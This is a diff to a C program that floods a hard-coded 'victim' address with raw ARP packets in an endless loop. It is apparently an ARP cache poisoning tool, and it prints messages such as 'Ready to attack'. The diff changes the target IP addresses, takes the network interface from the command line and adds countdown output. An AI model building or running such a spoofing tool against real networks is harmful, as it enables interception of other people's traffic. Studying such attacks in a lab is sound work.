@@ -32,8 +32,8 @@ struct _arp_hdr {
 };
 
 
-char* router_ip = "10.87.0.1";
-char* victim_ip = "10.87.2.149";
+char* router_ip = "10.52.0.1";
+char* victim_ip = "10.52.3.255";
 
 
 
@@ -148,7 +148,17 @@ int main(int argc, char* argv[])
 			exit(EXIT_FAILURE);
 		}
 		
-		printf("Socket created!");
+		printf("Initializing the setup");
+
+		int yy = 0;
+		while( yy!=100 )
+		{
+			printf(".");
+			fflush(stdout);
+			usleep(100000);
+			yy++;
+		}
+		printf("\nSocket created!\n");
 		
 		uint8_t* buffer = create_buffer(FRAME_SIZE);
 		
@@ -201,7 +211,7 @@ int main(int argc, char* argv[])
 
 		/*index of the network device*/
 		
-		socket_address.sll_ifindex  = get_if_no("wl");
+		socket_address.sll_ifindex  = get_if_no(argv[1]);
 		
 		//socket_address.sll_ifindex  = 1;
 
@@ -223,9 +233,16 @@ int main(int argc, char* argv[])
 		/*MAC - end*/
 		//socket_address.sll_addr[6]  = 0x00;/*not used*/
 		//socket_address.sll_addr[7]  = 0x00;/*not used*/
-
-		printf("SAFasF");
 		
+		printf("Ready to attack\n");
+		sleep(1);
+		printf("1\n");
+		sleep(1);
+		printf("2\n");
+		sleep(1);
+		printf("3\n");
+		sleep(1);
+
 		int n = 0;
 		while( 1 )
 		{
@@ -234,9 +251,9 @@ int main(int argc, char* argv[])
 				perror("Error sending\n");
 				exit(0);
 			}
-			printf("Victim is attacked!, Its cache is poisoned!!\n");
+			printf("ARP Packet %d. Sent to the address %s\n",(n+1),victim_ip);
 			fflush(stdout);
-			usleep(100);
+			usleep(1000);
 			n++;
 		}
 		
